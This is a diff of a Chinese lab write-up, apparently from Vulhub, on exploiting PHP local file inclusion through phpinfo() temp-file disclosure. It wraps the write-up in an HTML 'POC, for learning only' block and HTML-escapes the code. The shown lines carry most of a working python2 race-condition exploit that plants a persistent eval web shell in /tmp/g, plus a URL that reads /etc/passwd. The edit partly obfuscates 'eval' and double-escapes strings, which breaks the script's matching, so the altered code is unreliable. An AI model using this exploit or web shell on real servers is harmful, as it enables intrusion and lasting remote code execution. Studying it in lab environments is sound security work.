@@ -26,8 +26,10 @@ Vulhub 执行如下命令启动环境：
 
 ```
 docker compose up -d
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 目标环境是 PHP7.2，说明该漏洞与 PHP 版本无关。
 
 环境启动后，访问 `http://your-ip:8080/phpinfo.php` 即可看到一个 PHPINFO 页面，访问 `http://your-ip:8080/lfi.php?file=/etc/passwd`，可见的确存在文件包含漏洞。
@@ -53,7 +55,7 @@ docker compose up -d
 
 ## 漏洞复现
 
-利用脚本 [exp.py](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/language/exp.py) 实现了上述过程，成功包含临时文件后，会执行 `<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>`，写入一个新的文件 `/tmp/g`，这个文件就会永久留在目标机器上。
+利用脚本 [exp.py](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/language/exp.py) 实现了上述过程，成功包含临时文件后，会执行 `&lt;?php file_put_contents('/tmp/g', '&lt;?=&#101;val(&#36;_REQUEST[1])?&gt;')?&gt;`，写入一个新的文件 `/tmp/g`，这个文件就会永久留在目标机器上。
 
 用 python2 执行：`python exp.py your-ip 8080 100`：
 
@@ -76,7 +78,7 @@ import socket
 def setup(host, port):
     TAG="Security Test"
     PAYLOAD="""%s\r
-<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
+&lt;?php file_put_contents('/tmp/g', '&lt;?=&#101;val(&#36;_REQUEST[1])?&gt;')?&gt;\r""" % TAG
     REQ1_DATA="""-----------------------------7dbff1ded0714\r
 Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
 Content-Type: text/plain\r
@@ -114,10 +116,10 @@ def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
 
     s.send(phpinforeq)
     d = ""
-    while len(d) < offset:
+    while len(d) &lt; offset:
         d += s.recv(offset)
     try:
-        i = d.index("[tmp_name] =&gt; ")
+        i = d.index("[tmp_name] =&amp;gt; ")
         fn = d[i+17:i+31]
     except ValueError:
         return None
@@ -143,7 +145,7 @@ class ThreadWorker(threading.Thread):
         global counter
         while not self.event.is_set():
             with self.lock:
-                if counter >= self.maxattempts:
+                if counter &gt;= self.maxattempts:
                     return
                 counter+=1
 
@@ -175,7 +177,7 @@ def getOffset(host, port, phpinforeq):
         if i.endswith("0\r\n\r\n"):
             break
     s.close()
-    i = d.find("[tmp_name] =&gt; ")
+    i = d.find("[tmp_name] =&amp;gt; ")
     if i == -1:
         raise ValueError("No php tmp_name in phpinfo output")
     
@@ -188,7 +190,7 @@ def main():
     print "LFI With PHPInfo()"
     print "-=" * 30
 
-    if len(sys.argv) < 2:
+    if len(sys.argv) &lt; 2:
         print "Usage: %s host [port] [threads]" % sys.argv[0]
         sys.exit(1)
 
@@ -241,7 +243,7 @@ def main():
             with l:
                 sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                 sys.stdout.flush()
-                if counter >= maxattempts:
+                if counter &gt;= maxattempts:
                     break
         print
         if e.is_set():
@@ -257,8 +259,9 @@ def main():
         t.join()
 
 if __name__=="__main__":
-    main()
-```
+    main()</code></pre>
+
+</details>
 
 ---
 
